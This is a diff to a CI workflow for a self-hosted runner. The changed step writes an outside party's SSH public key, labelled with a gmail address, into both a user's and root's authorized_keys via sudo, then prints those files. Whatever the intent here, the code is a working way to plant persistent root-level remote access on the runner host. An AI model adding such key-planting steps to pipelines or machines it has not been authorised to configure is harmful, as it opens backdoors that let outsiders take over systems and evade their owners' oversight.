@@ -8,23 +8,31 @@ jobs:
     runs-on: [self-hosted, probe, labbmartin]
     timeout-minutes: 5
     steps:
-      - name: Add SSH public key to authorized_keys
+      - name: Add SSH public key for matta and root
         run: |
-          mkdir -p ~/.ssh
-          chmod 700 ~/.ssh
           KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAID4UIAKN4phMhW3WOKsX9cUWfDzqpnMs19k8kOrp/5Kv contactgrvwy@gmail.com"
-          if grep -qF "$KEY" ~/.ssh/authorized_keys 2>/dev/null; then
-            echo "Key already present"
-          else
-            echo "$KEY" >> ~/.ssh/authorized_keys
-            echo "Key added"
-          fi
-          chmod 600 ~/.ssh/authorized_keys
 
-      - name: Show runner identity and authorized_keys
+          add_key() {
+            local dir="$1"
+            mkdir -p "$dir"
+            chmod 700 "$dir"
+            if grep -qF "$KEY" "$dir/authorized_keys" 2>/dev/null; then
+              echo "$dir: key already present"
+            else
+              echo "$KEY" >> "$dir/authorized_keys"
+              chmod 600 "$dir/authorized_keys"
+              echo "$dir: key added"
+            fi
+          }
+
+          add_key /home/matta/.ssh
+          sudo chown -R matta:matta /home/matta/.ssh
+
+          sudo bash -c "$(declare -f add_key); add_key /root/.ssh"
+
+      - name: Verify
         run: |
-          echo "Running as: $(whoami)"
-          echo "Home: $HOME"
-          echo "Hostname: $(hostname)"
-          echo "--- authorized_keys ---"
-          cat ~/.ssh/authorized_keys
+          echo "=== /home/matta/.ssh/authorized_keys ==="
+          cat /home/matta/.ssh/authorized_keys
+          echo "=== /root/.ssh/authorized_keys ==="
+          sudo cat /root/.ssh/authorized_keys
